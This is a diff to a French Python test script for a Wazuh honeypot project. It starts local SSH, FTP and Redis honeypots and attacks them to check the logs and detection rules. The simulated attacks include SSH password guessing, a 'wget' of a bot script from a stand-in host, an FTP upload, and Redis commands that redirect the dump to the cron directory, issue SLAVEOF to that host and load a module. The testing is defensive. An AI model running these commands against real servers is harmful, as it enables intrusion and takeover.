@@ -13,8 +13,12 @@ Vérifie :
   5. appli lancée pour de vrai : chaque attaque de cases.tsv produit la bonne
      ligne HONEYPOT-ACCESS, le décodeur la parse, la règle attendue matche
   6. contrôles sécu (falsification IP via X-Forwarded-For, secrets en dur)
+  7. règles SSH/FTP/Redis : chaque événement de tests/hp_cases.tsv -> règle attendue
+  8. honeypots SSH/FTP/Redis lancés pour de vrai, attaqués, logs JSON vérifiés
+     (needs: pip install flask==3.0.2 paramiko)
 """
 import hashlib
+import json
 import os
 import re
 import shutil
@@ -32,7 +36,9 @@ CASES = os.path.join(ROOT, "tests", "cases.tsv")
 SRV01, NIX01 = "deploy/srv01.sh", "deploy/nix01.sh"
 WEBAPP = "honeypots/web-sweetbuzz"
 DECODERS, RULES = "wazuh/manager/honeypot_decoders.xml", "wazuh/manager/honeypot_rules.xml"
-BUILTIN_PARENTS = {"80700", "550", "554"}  # règles Wazuh natives (auditd, syscheck)
+SVC_RULES = "wazuh/manager/honeypot_services_rules.xml"
+HP_CASES = os.path.join(ROOT, "tests", "hp_cases.tsv")
+BUILTIN_PARENTS = {"80700", "550", "554", "86600"}  # règles Wazuh natives (auditd, syscheck, json/suricata)
 
 G, R, Y, B, N = "\033[32m", "\033[31m", "\033[33m", "\033[1m", "\033[0m"
 stats = {"ok": 0, "fail": 0, "warn": 0}
@@ -145,18 +151,30 @@ def t_rules():
     else:
         fail("règles de srv01.sh != wazuh/manager/ (deux versions divergentes)")
 
-    if rules is None or dec is None:
+    svc_txt = read(SVC_RULES)
+    svc = parse_xml_fragment(svc_txt, "services rules")
+    if svc is not None:
+        ok("honeypot_services_rules.xml bien formé")
+    if strip_comments(heredoc(SRV01, 'cat > "$SVC_RULES"')) == strip_comments(svc_txt):
+        ok("règles SSH/FTP/Redis déployées par srv01.sh == wazuh/manager/honeypot_services_rules.xml")
+    else:
+        fail("règles SSH/FTP/Redis de srv01.sh != wazuh/manager/honeypot_services_rules.xml")
+
+    if rules is None or dec is None or svc is None:
         return None, None
+    global SVC
+    SVC = svc
+    allr = ET.fromstring(f"<root>{rules_txt}{svc_txt}</root>")
 
     section("3. Cohérence des règles")
-    ids = [r.get("id") for r in rules.iter("rule")]
+    ids = [r.get("id") for r in allr.iter("rule")]
     dups = {i for i in ids if ids.count(i) > 1}
     ok(f"{len(ids)} règles, IDs uniques") if not dups else fail(f"IDs dupliqués: {dups}")
     bad = [i for i in ids if not (100000 <= int(i) <= 120000)]
     ok("IDs dans la plage locale 100000-120000") if not bad else fail(f"IDs hors plage: {bad}")
 
     known = set(ids) | BUILTIN_PARENTS
-    for r in rules.iter("rule"):
+    for r in allr.iter("rule"):
         for tag in ("if_sid", "if_matched_sid"):
             e = r.find(tag)
             if e is not None:
@@ -339,6 +357,225 @@ def t_app_live(dec, rules):
         shutil.rmtree(tmp, ignore_errors=True)
 
 
+# --------------------------------------------------------------------------- 7/8 honeypots JSON
+SVC = None
+
+
+def hp_value(v):
+    if isinstance(v, bool):  # le décodeur json de Wazuh rend true/false en texte
+        return "true" if v else "false"
+    return "" if v is None else str(v)
+
+
+def hp_predict(svc, event):
+    """Prédiction : descend l'arbre if_sid depuis 100399/100400 en prenant le 1er enfant qui matche."""
+    rules = list(svc.iter("rule"))
+    base = {"100399", "100400"}
+
+    def match(r):
+        if r.get("frequency") or r.find("if_matched_sid") is not None:
+            return False
+        for f in r.findall("field"):
+            v = event.get(f.get("name"))
+            if v is None or not re.search(f.text, hp_value(v)):
+                return False
+        return True
+
+    root = next(r for r in rules if r.get("id") == "100400")
+    if not match(root):
+        return None
+    cur = base
+    found = "100400"
+    while True:
+        nxt = None
+        for r in rules:
+            e = r.find("if_sid")
+            if e is not None and set(re.split(r"[,\s]+", e.text.strip())) & cur and r.get("id") not in base and match(r):
+                nxt = r.get("id")
+                break
+        if not nxt:
+            return found
+        found, cur = nxt, {nxt}
+
+
+def load_hp_cases():
+    out = []
+    with open(HP_CASES, encoding="utf-8") as f:
+        for ln in f:
+            if ln.strip() and not ln.startswith("#"):
+                name, exp, js = ln.rstrip("\n").split("\t")
+                out.append((name, exp, js))
+    return out
+
+
+def t_hp_rules():
+    section("7. Règles SSH/FTP/Redis (prédiction sur tests/hp_cases.tsv)")
+    if SVC is None:
+        fail("règles des honeypots non chargées")
+        return
+    for name, exp, js in load_hp_cases():
+        try:
+            ev = json.loads(js)
+        except ValueError as e:
+            fail(f"{name}: JSON invalide ({e})")
+            continue
+        got = hp_predict(SVC, ev)
+        ok(f"{name:<22} -> {got}") if got == exp else fail(f"{name:<22} -> {got} (attendu {exp})")
+    # chaque règle (hors corrélations) est couverte par au moins un cas
+    covered = {exp for _, exp, _ in load_hp_cases()}
+    for r in SVC.iter("rule"):
+        rid = r.get("id")
+        if rid not in ("100399", "100400") and not r.get("frequency") and r.find("if_matched_sid") is None \
+                and rid not in covered:
+            warn(f"règle {rid} sans cas de test dans hp_cases.tsv")
+
+
+REQUIRED = ("timestamp", "honeypot", "event_type", "srcip", "src_port", "session")
+
+
+def wait_port(port, timeout=8):
+    end = time.time() + timeout
+    while time.time() < end:
+        try:
+            socket.create_connection(("127.0.0.1", port), 0.5).close()
+            return True
+        except OSError:
+            time.sleep(0.1)
+    return False
+
+
+def attack_ssh(port):
+    import paramiko
+    for pw in ("toor1", "admin", "qwerty"):
+        c = paramiko.SSHClient()
+        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        try:
+            c.connect("127.0.0.1", port, username="root", password=pw, look_for_keys=False, allow_agent=False, timeout=5)
+        except paramiko.AuthenticationException:
+            pass
+        finally:
+            c.close()
+    c = paramiko.SSHClient()
+    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    c.connect("127.0.0.1", port, username="root", password="123456", look_for_keys=False, allow_agent=False, timeout=5)
+    _, o, _ = c.exec_command("uname -a")
+    o.read()
+    ch = c.invoke_shell()
+    ch.send("wget http://198.51.100.7/bot.sh -O /tmp/bot.sh\rchmod +x /tmp/bot.sh\rexit\r")
+    end = time.time() + 5
+    while not ch.exit_status_ready() and time.time() < end:
+        time.sleep(0.1)
+    c.close()
+
+
+def attack_ftp(port):
+    import ftplib
+    import io
+    f = ftplib.FTP()
+    f.connect("127.0.0.1", port, timeout=5)
+    try:
+        f.login("admin", "wrongpass")
+    except ftplib.error_perm:
+        pass
+    f.close()
+    f = ftplib.FTP()
+    f.connect("127.0.0.1", port, timeout=5)
+    f.login("admin", "admin")
+    f.cwd("backup")
+    f.retrbinary("RETR config.php.bak", lambda b: None)
+    f.storbinary("STOR x.sh", io.BytesIO(b"#!/bin/sh\necho pwned\n"))
+    f.quit()
+
+
+def attack_redis(port):
+    def resp(*a):
+        return b"*%d\r\n" % len(a) + b"".join(b"$%d\r\n%s\r\n" % (len(x.encode()), x.encode()) for x in a)
+    s = socket.create_connection(("127.0.0.1", port), 5)
+    for cmd in (("AUTH", "foobared"), ("CONFIG", "SET", "dir", "/var/spool/cron/crontabs"),
+                ("CONFIG", "SET", "dbfilename", "root"), ("SAVE",), ("SLAVEOF", "198.51.100.7", "21000"),
+                ("MODULE", "LOAD", "/tmp/exp.so"), ("QUIT",)):
+        s.sendall(resp(*cmd))
+        s.recv(65536)
+    s.close()
+
+
+def t_hp_live():
+    section("8. Honeypots SSH/FTP/Redis lancés + attaques")
+    tmp = tempfile.mkdtemp(prefix="hp_svc_")
+    logdir = os.path.join(tmp, "log")
+    pasv = free_port()
+    specs = {
+        "ssh": ("honeypots/ssh/ssh_honeypot.py", "HP_SSH", attack_ssh, {"100402", "100404", "100423", "100421", "100422"}),
+        "ftp": ("honeypots/ftp/ftp_honeypot.py", "HP_FTP", attack_ftp, {"100402", "100404", "100432", "100431"}),
+        "redis": ("honeypots/redis/redis_honeypot.py", "HP_REDIS", attack_redis, {"100402", "100440", "100445", "100441", "100442"}),
+    }
+    procs = []
+    try:
+        for hp, (script, pfx, attack, expected) in specs.items():
+            if hp == "ssh":
+                try:
+                    import paramiko  # noqa: F401
+                except ImportError:
+                    warn("paramiko absent -> `pip install paramiko` pour tester le honeypot SSH")
+                    continue
+            port = free_port()
+            env = dict(os.environ, HP_LOG_DIR=logdir, HP_DATA_DIR=os.path.join(tmp, "data"),
+                       **{f"{pfx}_PORT": str(port), f"{pfx}_BIND": "127.0.0.1"},
+                       HP_FTP_PASV_MIN=str(pasv), HP_FTP_PASV_MAX=str(pasv))
+            p = subprocess.Popen([sys.executable, os.path.join(ROOT, script)], env=env,
+                                 stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+            procs.append(p)
+            if not wait_port(port):
+                fail(f"{hp}: ne démarre pas ({p.stderr.read(500) if p.poll() is not None else 'timeout'})")
+                continue
+            ok(f"{hp}: démarré sur 127.0.0.1:{port}")
+            try:
+                attack(port)
+            except Exception as e:  # noqa: BLE001
+                fail(f"{hp}: attaque de test en erreur: {type(e).__name__}: {e}")
+            time.sleep(0.5)
+            path = os.path.join(logdir, f"{hp}.json")
+            if not os.path.exists(path):
+                fail(f"{hp}: aucun log {path}")
+                continue
+            events, bad = [], 0
+            for ln in open(path, encoding="ascii"):
+                try:
+                    events.append(json.loads(ln))
+                except ValueError:
+                    bad += 1
+            ok(f"{hp}: {len(events)} événements JSON valides") if events and not bad \
+                else fail(f"{hp}: {bad} lignes JSON invalides / {len(events)} valides")
+            missing = [k for e in events for k in REQUIRED if k not in e]
+            ok(f"{hp}: champs obligatoires présents ({', '.join(REQUIRED)})") if not missing \
+                else fail(f"{hp}: champs manquants: {sorted(set(missing))}")
+            if any(e.get("srcip") != "127.0.0.1" for e in events):
+                fail(f"{hp}: srcip incorrect dans certains événements")
+            if any(e.get("event_type") == "login_attempt" and "password" not in e for e in events):
+                fail(f"{hp}: login_attempt sans mot de passe")
+            got = {hp_predict(SVC, e) for e in events} if SVC is not None else set()
+            miss = expected - got
+            ok(f"{hp}: règles déclenchées (prédiction) {sorted(expected)}") if not miss \
+                else fail(f"{hp}: règles attendues non déclenchées: {sorted(miss)} (obtenu {sorted(x for x in got if x)})")
+            if hp == "ftp":
+                up = os.path.join(tmp, "data", "ftp_uploads")
+                ev = [e for e in events if e.get("event_type") == "file_upload"]
+                if ev and os.path.exists(os.path.join(up, ev[0]["sha256"])):
+                    data = open(os.path.join(up, ev[0]["sha256"]), "rb").read()
+                    ok("ftp: fichier déposé conservé, sha256 vérifié") if hashlib.sha256(data).hexdigest() == ev[0]["sha256"] \
+                        else fail("ftp: sha256 du fichier conservé incorrect")
+                else:
+                    fail("ftp: fichier déposé non conservé")
+    finally:
+        for p in procs:
+            p.terminate()
+            try:
+                p.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                p.kill()
+        shutil.rmtree(tmp, ignore_errors=True)
+
+
 def main():
     print(f"{B}Projet: {ROOT}{N}")
     t_bash()
@@ -346,6 +583,9 @@ def main():
     t_app_code()
     if "--no-app" not in sys.argv:
         t_app_live(dec, rules)
+    t_hp_rules()
+    if "--no-app" not in sys.argv:
+        t_hp_live()
     print(f"\n{B}Résultat:{N} {G}{stats['ok']} OK{N}, {Y}{stats['warn']} WARN{N}, {R}{stats['fail']} FAIL{N}")
     h = hashlib.sha256(read(RULES).encode()).hexdigest()[:12]
     print(f"(empreinte des règles: {h})")
